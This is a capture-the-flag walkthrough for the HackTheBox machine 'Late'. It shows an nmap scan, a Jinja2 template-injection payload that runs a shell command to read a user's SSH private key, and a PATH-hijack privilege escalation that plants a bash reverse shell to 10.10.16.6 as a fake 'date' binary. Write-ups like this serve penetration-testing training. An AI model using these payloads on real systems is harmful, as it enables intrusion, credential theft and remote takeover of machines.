# HTB - Late

## Nmap

```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-26 20:09 CEST
Nmap scan report for 10.129.52.249
Host is up (0.085s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 393.98 seconds
```

## Port 80

<img src="https://github.com/UllernJ/CTF/blob/main/HTB/HTB-Late/Skjermbilde%20fra%202022-04-28%2021-59-57.png">

When we go around this page we'll find out that they have a subdomain called "images.late.htb/".
<p>To access this we need to add this to our known hosts @ /etc/hosts/.
<p>When we mess around here we discover that this a python app image reader. What we want to do now is to break it.
<p>A known payload to inject code into python apps is to use double brackets with code forexample:
  
 ```
  input: {{ 2*2 }}
  output: 4
```
  
What we would need to here to insert the payload to a image and make it readable to the reader and it would respond to that.
<p>With help of this <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">page</a> with various payloads I managed to get user with this payload:
  
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /home/svc_acc/.ssh/id_rsa').read() }}
We extract the rsa key to ssh to the user without the password.

```

  <img src="https://github.com/UllernJ/CTF/blob/main/HTB/HTB-Late/Skjermbilde%20fra%202022-04-28%2021-58-54.png">
  
## root

  First of I want to check for vulnerabilities with <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linpeas</a>.
  <p>I download it on my computer and make the "victim" download the linpeas from me. (because hackthebox wont let you download from github).
  <p>We can see that linpeas marks a folder named /usr/local/sbin.
  <p> Are we can find a file named ssh-alert.sh
    
```
    #!/bin/bash
RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"
BODY="
A SSH login was detected.
        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
```
    
 So what happens here is that root will call to this program every time someone ssh into the server.
<p>So what we can do here is exploit the programs <b>date</b> and <b>uname</b>. These programs are being called from path, so what we can do is to examine our path:

```
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```
 
Lets say we create a file named date as a executeable here. Root would run it because of the PATH misconfiguration.
I create a file named date with a reverse shell:
```
  bash -i >& /dev/tcp/10.10.16.6/1234 0>&1
```
  
What we need to do now is just to ssh into the server agian and root will execute the ssh-alert.sh that also runs "date" (our reverseshell).
BOOM ROOT
<p><img src="https://github.com/UllernJ/CTF/blob/main/HTB/HTB-Late/root.png">

 
  
